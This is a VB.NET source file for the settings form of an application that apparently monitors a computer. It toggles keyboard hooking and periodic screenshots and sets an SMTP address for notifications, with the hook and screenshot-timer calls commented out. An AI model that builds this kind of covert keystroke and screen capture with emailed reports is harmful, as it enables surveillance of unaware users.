Public Class FrmParametri

    Private Sub btnOk_Click(sender As Object, e As EventArgs) Handles btnOk.Click
        Try
            DMD.Sistema.EMailer.Config.SMTPLimitOutSent = Me.txtSMTPLimit.Value

            DIALTPLib.Settings.SMTPNotifyTo = Me.txtNotifyTo.Text
            'DIALTPLib.Settings.ScreenShotEvery = Me.txtScreenShotevery.Value
            DIALTPLib.Settings.LogEvery = Me.txtLogInterval.Value
            DIALTPLib.Settings.Flags = DMD.Sistema.SetFlag(DIALTPLib.Settings.Flags, My.AppFlags.NOKEYBOARD, Not Me.chkKeyboard.Checked)
            DIALTPLib.Settings.Flags = DMD.Sistema.SetFlag(DIALTPLib.Settings.Flags, My.AppFlags.NOSCREENSCHOTS, Not Me.chkScreenShots.Checked)
            DIALTPLib.Settings.SMTPLimitOutSent = Me.txtSMTPLimit.Value
            My.Settings.Save()
            Me.Close()

            'If Not DMD.Sistema.TestFlag(DIALTPLib.Settings.Flags, My.AppFlags.NOKEYBOARD) Then
            '    DIALTPLib.Keyboard.HookKeyboard()
            'Else
            '    DIALTPLib.Keyboard.UnhookKeyboard()
            'End If

            'Log.timer.Enabled = True
            'Log.timer.Interval = Math.Max(1000, My.Settings.LogEvery * 1000)
            'My.MyApplication.ScreenShotTimer.Interval = Math.Max(My.Settings.ScreenShotEvery * 1000, 1000)
            'My.MyApplication.ScreenShotTimer.Enabled = DMD.Sistema.TestFlag(My.Settings.Flags, My.AppFlags.NOSCREENSCHOTS)

        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub FrmParametri_Load(sender As Object, e As EventArgs) Handles Me.Load
        Try
            Me.txtLogInterval.Value = Math.Min(DIALTPLib.Settings.LogEvery, Me.txtLogInterval.Maximum)
            Me.txtNotifyTo.Text = DIALTPLib.Settings.SMTPNotifyTo
            Me.chkKeyboard.Checked = Not DMD.Sistema.TestFlag(DIALTPLib.Settings.Flags, My.AppFlags.NOKEYBOARD)
            Me.chkScreenShots.Checked = Not DMD.Sistema.TestFlag(DIALTPLib.Settings.Flags, My.AppFlags.NOSCREENSCHOTS)
            Me.txtSMTPLimit.Value = DIALTPLib.Settings.SMTPLimitOutSent
        Catch ex As Exception
            DMD.Sistema.Events.NotifyUnhandledException(ex)
            MsgBox(ex.Message, MsgBoxStyle.Critical)
        End Try
    End Sub

    Private Sub btnCancel_Click(sender As Object, e As EventArgs) Handles btnCancel.Click
        Me.Close()
    End Sub

  
End Class